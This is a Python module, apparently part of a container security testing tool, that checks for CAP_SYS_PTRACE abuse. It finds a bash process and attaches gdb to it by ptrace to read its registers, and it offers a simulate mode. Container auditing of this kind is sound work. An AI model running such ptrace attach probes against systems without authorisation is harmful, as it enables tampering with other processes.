# Path: attacks/cap_abuse.py

import os
import subprocess

def run(container_name, simulate=False):
    print("[*] Running CAP_SYS_PTRACE Abuse Exploit...")

    if simulate:
        print("[SIMULATE] Would attempt ptrace attach to another process.")
        return "Simulated CAP_SYS_PTRACE abuse."

    try:
        # Step 1: Find a target process (bash or sleep is commonly used)
        print("[*] Locating target PID (bash)...")
        result = subprocess.run(["pidof", "bash"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode != 0 or not result.stdout.strip():
            print("[-] Failed to find bash process.")
            return
        pid = result.stdout.strip().split()[0]
        print(f"[+] Found PID: {pid}")

        # Step 2: Attempt to attach using ptrace
        print(f"[*] Attaching to process {pid} using gdb...")
        gdb_command = f"gdb -p {pid} -ex 'info registers' -ex 'detach' -ex 'quit'"
        os.system(gdb_command)

        print("[+] Exploit execution finished.")

    except Exception as e:
        print(f"[!] Exception occurred: {e}")
